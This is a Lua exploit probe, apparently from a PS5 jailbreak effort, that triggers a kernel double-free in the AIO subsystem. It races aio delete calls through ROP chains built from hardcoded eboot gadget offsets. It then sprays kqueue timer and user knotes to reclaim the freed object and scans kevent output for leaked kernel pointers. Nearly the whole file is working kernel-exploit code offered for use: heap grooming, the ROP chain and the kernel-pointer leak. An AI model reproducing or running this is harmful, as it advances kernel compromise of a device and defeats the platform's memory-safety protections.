-- CRASH_CLASS: MODERATE
-- PROBE 69r: Kqueue knote spray to reclaim R-object after double-free
--
-- Each EVFILT_TIMER registration allocates a struct knote (~120B).
-- On PS5 FreeBSD 11, this may land in the 128B UMA bucket (same as
-- I-object at 88B). We test if massive knote sprays can also land
-- in 64B bucket by testing with EVFILT_USER (smaller knote variant).
--
-- Also tests: per-CPU cache exhaustion. UMA caches 4-64 objects
-- per CPU; we need to spray past that to reach the central free list
-- where the double-freed R-object sits.

print("=== PROBE 69r: KQUEUE KNOTE SPRAY + DOUBLE-FREE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_ig = memory.alloc(0x20)
wq(N(sa_ig), uint64(1)); wd(N(sa_ig) + 8, 0); wq(N(sa_ig) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_ig, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_ig, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_ig, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(one_id)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- ============================================================
-- [A] BASELINE: measure 624 delta per kqueue + per kevent
-- ============================================================
print("")
print("[A] Baseline: kqueue + kevent allocation cost via 624")

local function get_624()
    local r = nil
    pcall(function() r = mk(624)(uint64(0)) end)
    return r and N(r) or 0
end

-- Create 50 kqueues, measure 624
local kq_fds = {}
local pre = get_624()
for i = 1, 50 do
    local ret = nil
    pcall(function() ret = mk(362)() end)
    if ret then
        local fd = sgn(ret)
        if fd >= 0 then table.insert(kq_fds, fd) end
    end
end
local post = get_624()
print(string.format("  50 kqueues: 624 delta=%d (per kqueue=%.1f)", post - pre, (post - pre) / 50))

-- Now register EVFILT_TIMER on each kqueue (1 per kqueue)
-- struct kevent: {ident(8), filter(2), flags(2), fflags(4), data(8), udata(8)} = 32 bytes
-- EV_ADD=1, EVFILT_TIMER=-7
local kev = memory.alloc(64)
pre = get_624()

for i, fd in ipairs(kq_fds) do
    -- ident = i
    wq(N(kev), uint64(i))
    -- filter = -7 (EVFILT_TIMER), flags = EV_ADD(1)|EV_ENABLE(4) = 5
    -- packed: filter(i16) at +8, flags(u16) at +10
    wd(N(kev) + 8, 0x0005FFF9)  -- flags=5, filter=0xFFF9=-7
    wd(N(kev) + 12, 0)           -- fflags
    wq(N(kev) + 16, uint64(1000))  -- data = 1000ms interval
    wq(N(kev) + 24, uint64(0xCAFE0000 + i))  -- udata = sentinel

    pcall(function()
        mk(363)(uint64(fd), uint64(N(kev)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
end

post = get_624()
print(string.format("  50 EVFILT_TIMER: 624 delta=%d (per knote=%.1f)", post - pre, (post - pre) / 50))

if not alive() then print("DEAD after section A"); return end

-- Close kqueues
for _, fd in ipairs(kq_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
kq_fds = {}

-- ============================================================
-- [B] Double-free -> kevent spray -> readback
-- ============================================================
print("")
print("[B] Double-free -> EVFILT_TIMER spray -> kevent readback")

local ITERS = 15
local KNOTE_SPRAY = 256
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit + poll
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then
        print(string.format("  iter %d: only %d IDs", iter, #ids))
        break
    end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Double-free
    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles", iter))
    else
        -- Spray knotes: create kqueues with EVFILT_TIMER events
        local spray_kqs = {}
        for i = 1, KNOTE_SPRAY do
            local ret = nil
            pcall(function() ret = mk(362)() end)
            if ret then
                local fd = sgn(ret)
                if fd >= 0 then
                    table.insert(spray_kqs, fd)
                    -- Register EVFILT_TIMER with sentinel udata
                    wq(N(kev), uint64(0xBEEF0000 + i))
                    wd(N(kev) + 8, 0x0005FFF9)
                    wd(N(kev) + 12, 0)
                    wq(N(kev) + 16, uint64(60000))  -- 60s interval
                    wq(N(kev) + 24, uint64(0xDEAD0000 + i))
                    pcall(function()
                        mk(363)(uint64(fd), uint64(N(kev)), uint64(1),
                            uint64(0), uint64(0), uint64(0))
                    end)
                end
            end
        end

        -- Read back events: kevent with 0 timeout to check fired timers
        -- Output kevent buffer for each kqueue
        local out_kev = memory.alloc(64)
        local ts = memory.alloc(16)
        wq(N(ts), uint64(0)); wq(N(ts) + 8, uint64(0))
        local iter_kptrs = 0

        for idx, fd in ipairs(spray_kqs) do
            -- Clear output
            for j = 0, 7 do wd(N(out_kev) + j * 4, 0xBEEFBEEF) end

            pcall(function()
                mk(363)(uint64(fd), uint64(0), uint64(0),
                    uint64(N(out_kev)), uint64(1), uint64(N(ts)))
            end)

            -- Check output kevent for kernel pointers
            -- ident(8), filter(2), flags(2), fflags(4), data(8), udata(8) = 32B
            for off = 0, 24, 8 do
                local qv = rq(uint64(string.format("0x%X", N(out_kev) + off)))
                if is_kptr(qv) then
                    print(string.format("  *** KPTR in kevent output kq#%d off=%d: %s",
                        idx, off, fmt(qv)))
                    iter_kptrs = iter_kptrs + 1
                end
            end
        end

        total_kptrs = total_kptrs + iter_kptrs
        print(string.format("  iter %d: %d doubles, %d kqueues, %d kptrs",
            iter, doubles, #spray_kqs, iter_kptrs))

        -- Close kqueues (destroys knotes)
        for _, fd in ipairs(spray_kqs) do
            pcall(function() mk(6)(uint64(fd)) end)
        end
    end
end

print("")
print(string.format("[B] Total kernel pointers: %d", total_kptrs))

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] Double-free -> EVFILT_USER spray (different knote size)
-- ============================================================
print("")
print("[C] Double-free -> EVFILT_USER spray")
-- EVFILT_USER = -11 (0xFFF5)

local total_kptrs_c = 0

for iter = 1, 10 do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then break end
    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles", iter))
    else
        -- One kqueue, many EVFILT_USER events
        local kq_fd = nil
        pcall(function() kq_fd = mk(362)() end)
        if not kq_fd then
            print(string.format("  iter %d: kqueue failed", iter))
        else
            local kq = sgn(kq_fd)
            local user_count = 0

            for i = 1, 256 do
                wq(N(kev), uint64(i))
                wd(N(kev) + 8, 0x0001FFF5)  -- flags=EV_ADD(1), filter=EVFILT_USER(-11=0xFFF5)
                wd(N(kev) + 12, 0)
                wq(N(kev) + 16, uint64(0))
                wq(N(kev) + 24, uint64(0xFACE0000 + i))
                local kret = nil
                pcall(function()
                    kret = mk(363)(uint64(kq), uint64(N(kev)), uint64(1),
                        uint64(0), uint64(0), uint64(0))
                end)
                if kret then
                    local kr = sgn(kret)
                    if kr >= 0 then user_count = user_count + 1 end
                end
            end

            -- Trigger: set fflags on EVFILT_USER to fire them
            local triggered = 0
            for i = 1, math.min(user_count, 256) do
                wq(N(kev), uint64(i))
                wd(N(kev) + 8, 0x0000FFF5)  -- no flags change, just filter
                wd(N(kev) + 12, 0x00100001)  -- NOTE_TRIGGER | NOTE_FFNOP
                wq(N(kev) + 16, uint64(0))
                wq(N(kev) + 24, uint64(0))
                pcall(function()
                    mk(363)(uint64(kq), uint64(N(kev)), uint64(1),
                        uint64(0), uint64(0), uint64(0))
                end)
                triggered = triggered + 1
            end

            -- Read back events
            local out_kevs = memory.alloc(32 * 8)
            local ts2 = memory.alloc(16)
            wq(N(ts2), uint64(0)); wq(N(ts2) + 8, uint64(0))

            pcall(function()
                mk(363)(uint64(kq), uint64(0), uint64(0),
                    uint64(N(out_kevs)), uint64(8), uint64(N(ts2)))
            end)

            local iter_kptrs = 0
            for ev = 0, 7 do
                for off = 0, 24, 8 do
                    local qv = rq(uint64(string.format("0x%X", N(out_kevs) + ev * 32 + off)))
                    if is_kptr(qv) then
                        print(string.format("  *** KPTR ev#%d off=%d: %s", ev, off, fmt(qv)))
                        iter_kptrs = iter_kptrs + 1
                    end
                end
            end

            total_kptrs_c = total_kptrs_c + iter_kptrs
            print(string.format("  iter %d: %d doubles, %d users, %d triggered, %d kptrs",
                iter, doubles, user_count, triggered, iter_kptrs))

            pcall(function() mk(6)(uint64(kq)) end)
        end
    end
end

print(string.format("[C] Total kernel pointers: %d", total_kptrs_c))

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("EVFILT_TIMER spray: %d kernel pointers", total_kptrs))
print(string.format("EVFILT_USER spray:  %d kernel pointers", total_kptrs_c))
print("")
print("=== PROBE 69r COMPLETE ===")
